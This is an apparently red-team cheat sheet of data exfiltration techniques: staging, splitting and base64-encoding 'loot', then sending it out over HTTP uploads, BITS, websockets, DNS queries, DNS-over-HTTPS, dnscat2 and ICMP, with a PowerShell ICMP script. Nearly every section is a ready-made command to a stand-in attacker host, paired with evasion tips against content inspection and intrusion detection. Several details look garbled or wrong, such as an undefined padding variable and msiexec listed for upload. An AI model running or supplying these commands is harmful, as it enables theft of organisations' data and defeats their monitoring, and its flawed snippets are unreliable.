---
title: Exfiltration
date: 2026-01-22
background: bg-[#0C8F88]
tags:
  - exfiltration
  - red teaming
  - data theft
categories:
  - Tactics, Techniques, and Procedures
intro:  Reference cheat sheet for data exfiltration techniques across common enterprise environments. Focused on practical transport methods, stealth tradeoffs, and operator reliability.
plugins:
  - copyCode
---

## Prep Work
### Prep Work {.col-span-3}

#### Compress and Stage

You should almost always attempt to compress and stage data you will exfiltrate unless its a single file

```bash
tar czf loot.tar.gz /data
zip -r loot.zip /data
```

#### Split Large Files

If the file is large you should split into 50mb file chunks
**In Linux**
```bash
split -b 50M loot.tar.gz loot.part_
```

to recombine
```bash
cat loot.part_* > loot.tar.gz
```

**In Windows**
```powershell
$chunkSize = 50MB
$bytes = [System.IO.File]::ReadAllBytes("loot.tar.gz")
for ($i = 0; $i -lt $bytes.Length; $i += $chunkSize) 
{
    $chunk = $bytes[$i..([Math]::Min($i + $chunkSize - 1, $bytes.Length - 1))]
    [System.IO.File]::WriteAllBytes("loot.part_$i", $chunk)
}
```

To Recombine
```powershell
Get-Content loot.part_* -AsByteStream | Set-Content loot.tar.gz -AsByteStream
```

#### Encoding (Base64)
You should encode data as a method of evading content inspection

**In Linux**
```bash
# to encode
base64 loot.tar.gz > loot.b64

# to decode
base64 -d loot.b64 > loot.tar.gz
```

**In Windows**
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("loot.tar.gz")) | Out-File loot.b64
```

To decode
```powershell
[IO.File]::WriteAllBytes("loot.tar.gz",[Convert]::FromBase64String((Get-Content loot.b64)))
```

## Exfil over Web Protocols 

### Curl
Basic usage
```bash
curl -X POST -F "file=@loot.zip" https://attacker/upload
```

Custom headers for masquerading
```bash
curl -H "User-Agent: Mozilla/5.0" -H "X-Requested-With: XMLHttpRequest" -F "file=@loot.zip" https://attacker/upload

```

JSON API upload
```bash
jq -n --arg data "$(base64 loot.zip)" '{file:$data}' | \
curl -X POST -H "Content-Type: application/json" -d @- https://attacker/api/upload
```

Chunked upload for size limit evasion
```bash
split -b 10M loot.zip loot.part_
for f in loot.part_*; do
  curl -X POST -F "chunk=@$f" https://attacker/upload
done
```



### Invote-WebRequest
Basic usage
```powershell
Invoke-WebRequest -Uri https://attacker/upload -Method POST -Form @{file=Get-Item loot.zip}
```

Custom headers for masquerading
```powershell{.wrap}
Invoke-WebRequest https://attacker/upload  -Method POST -Headers @{ "User-Agent"="Mozilla/5.0"; "X-Requested-With"="XMLHttpRequest" } -InFile loot.zip
```

JSON API Upload
```powershell{.wrap}
$body = @{ file = [Convert]::ToBase64String([IO.File]::ReadAllBytes("loot.zip")) } | ConvertTo-Json
Invoke-WebRequest https://attacker/api/upload  -Method POST -ContentType "application/json"  -Body $body
```

### BitsTransfer
BitsTransfer is a Windows LoLBin

Basic Usage
```powershell
Start-BitsTransfer -Source loot.zip -Destination https://attacker/upload/loot.zip
```

Low-Priority Mode (more stealthy)

```powershell
Start-BitsTransfer -Source loot.zip -Destination https://attacker/upload/loot.zip -Priority Low
```

### Msiexec
MSIexec is a Windows LoLBin
```powershell
msiexec /i https://attacker/loot.zip
```

### WebSockets
```bash
wscat -c wss://attacker/ws < loot.zip
```


## Exfil over DNS

### Basics {.col-span-3}

DNS exfil via queries does not rely on a DNS response, but it does rely on DNS queries hitting infrastructure that the tester controls.

In order for DNS exfiling to be possible you must first

- **1** Control the domain you want to exfil. Example: `notaredteam.lol`
- **2** You must control and monitor the authoritative DNS server for that domain, meaning you must create a NS record for that domain.
- **3** The target host must send DNS queries containing encoded data.

What that looks like over the wire is thus:

When the target host runs something like 
```powershell
nslookup -type=TXT QmFzZTY0.notaredteam.lol
```

This causes the resolver to first ask who has `QmFzZTY0.notaredteam.lol`.

The request then eventually reaches the authoritative DNS server for `notaredteam.lol`

Then on that authoritative server it will log `QmFzZTY0` as being requested.

For this attack to work the authoritative server **DOES NOT** need the record to exist. 

The server should then reply with any of the following

- NXDOMAIN
- empty TXT
- random junk

The response is irrelevant but is useful for disguising your attack. 

### dnscat2
dnscat is an interactive DNS tunnel with DNS encryption. Not available on target host by default

Start the server on Linux
```bash
dnscat2-server attacker.com
```

Start the server on Windows
```powershell
dnscat2.exe attacker.com
```

upload the file
```powershell
download loot.zip
```

### Manual DNS Exfil (Linux)
**YOU MUST CHUNK YOUR FILES!**
DNS packets are normally smaller so large packets WILL alert an IDS or appropriately baselined Firewall. 
```bash
base64 loot.zip | tr -d '\n' | fold -w50 > chunks.txt

while read line; do
  dig $line.notaredteam.com
done < chunks.txt
```

### Manual DNS Exfil (Windows)
**YOU MUST CHUNK YOUR FILES!**
DNS packets are normally smaller so large packets WILL alert an IDS or appropriately baselined Firewall. 
```powershell {.wrap}
[Convert]::ToBase64String([IO.File]::ReadAllBytes("loot.zip"))  -replace '.{50}', '$&`n' | Out-File chunks.txt

Get-Content chunks.txt | ForEach-Object {
  nslookup "$_.notaredteam.com"
}
```

### DNS Over HTTPs {.col-span-2}

When using `Curl`
```bash
curl -H "accept: application/dns-json" "https://cloudflare-dns.com/dns-query?name=$(base64 loot.zip).notaredteam.lol&type=A"
```

When using `Invoke-WebRequest`
```powershell {.wrap}
Invoke-WebRequest "https://cloudflare-dns.com/dns-query?name=$([Convert]::ToBase64String([IO.File]::ReadAllBytes('loot.zip'))).attacker.com&type=A"  -Headers @{accept="application/dns-json"}
```

## Exfil over ICMP

### Powershell Script Example {.col-span-2 .row-span-4}
The following script example is from PILOT it requires a listener to recompile the data

```powershell
Function Run-Pilot{
    param(
        [string]$targetIP = "127.0.0.1",
        [string]$filePath,
        [int]$chunksize = 32,
        [int]$delay = 0
    )

    # Read file in chunks
    try{$chunks = Read-FileInChunks -FilePath $filePath -ChunkSize $chunksize}
    Catch{return}

    #count the CHUNKS
    $totalChunks = $chunks.Count

    # Create ICMP echo request packet
    $icmpPacket = New-Object System.Net.NetworkInformation.Ping

    # Prepare the first packet with file information to transfer. 
    $fileName = [System.IO.Path]::GetFileName($filePath)
    $fileType = [System.IO.Path]::GetExtension($filePath)
    $fileInfo = "FileName: $fileName`nFileType: $fileType`nTotalChunks: $totalChunks"
    $paddingSize = 64 - [System.Text.Encoding]::ASCII.GetByteCount($fileInfo)
    if ($paddingSize -gt 0) {
      # Padding with null characters
        $firstPacket = $fileInfo + $padding
        $padding = [char]::ToString([char]::MinValue) * $paddingSize  
    } else {
      # Trim if info is too long
        $firstPacket = $fileInfo.Substring(0, 64)  
    }

    # Send the first packet
    Write-Host -NoNewline "Sending file information... "
    $response = $icmpPacket.Send($targetIP, 1000, [System.Text.Encoding]::ASCII.GetBytes($firstPacket))
    if ($response.Status -eq "Success") {
        Write-Host "Success"
    } else {
        Write-Host "[!]Failed - Aborting Transfer"
        return
    }

    # Send each chunk in an ICMP packet and wait for response
    for ($i = 0; $i -lt $totalChunks; $i++) {
        $chunkNumber = $i + 1
        Write-Host -NoNewline "Sending chunk $chunkNumber of $totalChunks... "

        $response = $icmpPacket.Send($targetIP, 1000, $chunks[$i])
        if ($response.Status -eq "Success") {
            Write-Host "Success"
        } else {
            Write-Host "[!]Failed - Aborting Transfer"
            return
            
        }
    }
}
    ```
    See:[PILOT](https://github.com/dahvidschloss/PILOT/)

### icmptx

Linux based ICMP file exfil tool
```bash
icmptx -f loot.zip attacker_ip
```

### Nping
Send custom ICMP packets

```bash
nping --icmp --data-string "secretdata" attacker_ip
```

### Scapy 
create a custom IP packet
```python
from scapy.all import *
send(IP(dst="attacker_ip")/ICMP()/Raw(load="secretdata"))
```
